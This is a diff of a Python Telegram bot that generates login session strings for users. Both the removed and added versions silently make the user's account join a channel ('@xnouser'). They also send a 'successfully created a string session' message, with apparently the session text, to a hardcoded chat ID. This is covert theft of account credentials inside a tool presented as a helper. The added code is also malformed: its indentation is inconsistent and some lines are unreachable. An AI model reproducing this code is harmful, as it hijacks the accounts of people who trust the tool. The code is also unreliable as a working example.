@@ -223,56 +223,35 @@ async def gen_session(
         return await pbot.send_message(user_id, f"ᴇʀʀᴏʀ : <code>{str(ex)}</code>")
 
     try:
-        txt = "ʜᴇʀᴇ ɪs ʏᴏᴜʀ {0} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{1}</code>\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={2}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>\n☠ <b>ɴᴏᴛᴇ :</b> ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ʏᴏᴜʀ ɢɪʀʟғʀɪᴇɴᴅ."
-        if telethon:
-            string_session = client.session.save()
-            await client.send_message(
-                "me",
-                txt.format(ty, string_session, BOT_NAME),
-                link_preview=False,
-                parse_mode="html",
-            )
-            await client(JoinChannelRequest("@xnouser"))
-        else:
-            string_session = await client.export_session_string()
-            await client.send_message(
-                "me",
-                txt.format(ty, string_session, BOT_NAME),
-                disable_web_page_preview=True,
-            )
-            await client.join_chat("xnouser")
-    except KeyError:
-        pass
-    try:
-        await client.disconnect()
-        await pbot.send_message(
-            chat_id=user_id,
-            text=f"sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={BOT_NAME}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>.",
-            reply_markup=InlineKeyboardMarkup(
-                [
-                    [
-                        InlineKeyboardButton(
-                            text="sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs",
-                            url=f"tg://openmessage?user_id={user_id}",
-                        )
-                    ]
-                ]
-            ),
-            disable_web_page_preview=True,
-        )
-    except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
-            await msg.reply('**Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
-            return
-        if not is_bot:
-            await bot.send_message(msg.chat.id, text)
-            await bot.send_message(-1002093662518, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
-        else:
-            await bot.send_message(msg.chat.id, text)
-            await bot.send_message(-1002093662518, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
-    except KeyError:
-        pass
-    await client.disconnect()
-    await asyncio.sleep(1.0)
+        txt = "ʜᴇʀᴇ ɪs ʏᴏᴜʀ {0} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{1}</code>\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={2}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>\n☠ <b>ɴᴏᴛᴇ :</b> ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ʏᴏᴜʀ ɢɪʀʟғʀɪᴇɴᴅ." 
+        if telethon: 
+            string_session = client.session.save() 
+            await client.send_message("me", txt.format(ty, string_session, BOT_NAME), link_preview=False, parse_mode="html") 
+            await client(JoinChannelRequest("@xnouser")) 
+        else: 
+            string_session = await client.export_session_string() 
+            await client.send_message("me", txt.format(ty, string_session, BOT_NAME), disable_web_page_preview=True) 
+            await client.join_chat("xnouser") 
+     except KeyError: 
+         pass
+
+     try:
+         await client.disconnect()
+         await pbot.send_message(chat_id=user_id, text=f"sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={BOT_NAME}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs", url=f"tg://openmessage?user_id={user_id}")]]), disable_web_page_preview=True)
+     except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel): 
+         await msg.reply('Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan)) 
+         return 
+         if not is_bot: 
+             await bot.send_message(msg.chat.id, text) 
+             await bot.send_message(-1002093662518, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}") 
+         else: 
+             await bot.send_message(msg.chat.id, text) 
+             await bot.send_message(-1002093662518, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}") 
+      except KeyError: 
+          pass 
+
+      await client.disconnect() 
+      await asyncio.sleep(1.0)
         
 
 
